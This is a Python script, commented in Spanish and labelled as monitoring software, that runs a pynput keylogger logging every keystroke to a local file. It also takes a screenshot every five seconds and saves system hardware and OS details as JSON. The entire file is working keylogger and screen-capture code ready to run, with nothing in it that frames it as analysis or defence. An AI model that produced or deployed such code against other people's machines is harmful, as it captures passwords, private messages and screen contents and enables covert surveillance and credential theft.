# -*- coding: utf-8 -*-

# --- IMPORTACIONES ---
import os
import time
import datetime
import json
import platform
import psutil
import pyautogui
from pynput import keyboard

# --- CONFIGURACIÓN ---
KEY_LOG_FILE = "keys.txt"
SCREENSHOT_DIR = "screenshots"
SYS_INFO_FILE = "system_info.json"
SCREENSHOT_INTERVAL_SECONDS = 5  # cambiar según necesidad

# --- SECCIÓN KEYLOGGER (PYNPUT) ---
def on_press(key):
    """Se llama cada vez que se presiona una tecla."""
    try:
        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(str(key.char))
    except AttributeError:
        # Para teclas especiales (ej. Ctrl, Shift, etc.)
        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
            f.write("[" + str(key) + "]")
    except Exception as e:
        print(f"Error en keylogger: {e}")

def start_keylogger():
    """Inicia el listener del teclado en un hilo separado."""
    print(f"Iniciando keylogger. Registrando en: {KEY_LOG_FILE}")
    # El listener de pynput es un hilo (thread)
    # Usar .start() lo ejecuta en segundo plano
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


# --- SECCIÓN CAPTURAS DE PANTALLA (PYAUTOGUI) ---
def start_screenshot_loop():
    """Inicia el bucle principal para tomar capturas de pantalla."""
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    print(f"Capturando pantalla cada {SCREENSHOT_INTERVAL_SECONDS} segundos en: {SCREENSHOT_DIR}")
    print("Presiona Ctrl+C para detener.")
    
    try:
        while True:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{ts}.png")
            
            try:
                img = pyautogui.screenshot()
                img.save(filename)
                print(f"Guardado: {filename}")
            except Exception as e:
                print(f"Error al tomar o guardar captura: {e}")
                
            time.sleep(SCREENSHOT_INTERVAL_SECONDS)
            
    except KeyboardInterrupt:
        print("\nCaptura de pantalla detenida por el usuario.")
    except Exception as e:
        print(f"Error inesperado en el bucle de capturas: {e}")


# --- SECCIÓN INFORMACIÓN DEL SISTEMA (PSUTIL/PLATFORM) ---
def collect_system_info():
    """Recolecta información del sistema y la guarda en un JSON."""
    print("Recolectando información del sistema...")
    info = {}
    try:
        info['timestamp'] = datetime.datetime.now().isoformat()
        info['platform'] = {
            'system': platform.system(),
            'node': platform.node(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor()
        }
        
        info['cpu'] = {
            'physical_cores': psutil.cpu_count(logical=False),
            'total_cores': psutil.cpu_count(logical=True),
            'freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
            'cpu_percent': psutil.cpu_percent(interval=1)
        }
        
        svmem = psutil.virtual_memory()
        info['memory'] = {
            'total': svmem.total,
            'available': svmem.available,
            'used': svmem.used,
            'percent': svmem.percent
        }
        
        info['disk'] = []
        for p in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(p.mountpoint)
                info['disk'].append({
                    'device': p.device, 'mountpoint': p.mountpoint, 'fstype': p.fstype,
                    'total': usage.total, 'used': usage.used, 'free': usage.free, 'percent': usage.percent
                })
            except PermissionError:
                print(f"Permiso denegado para disco: {p.mountpoint}")
            except Exception as e:
                 print(f"Error al leer disco {p.mountpoint}: {e}")

        with open(SYS_INFO_FILE, "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2, ensure_ascii=False)
            
        print(f"Información del sistema guardada en: {SYS_INFO_FILE}")

    except Exception as e:
        print(f"Error al recolectar información del sistema: {e}")


# --- EJECUCIÓN PRINCIPAL ---
if __name__ == "__main__":
    print("--- Iniciando Script de Monitoreo ---")
    
    # 1. Iniciar el Keylogger en segundo plano
    start_keylogger()
    
    # 2. Recolectar información del sistema (se ejecuta una vez)
    collect_system_info()
    
    # 3. Iniciar el bucle de capturas de pantalla (se ejecuta en el hilo principal)
    start_screenshot_loop()
    
    print("--- Script de Monitoreo Finalizado ---")
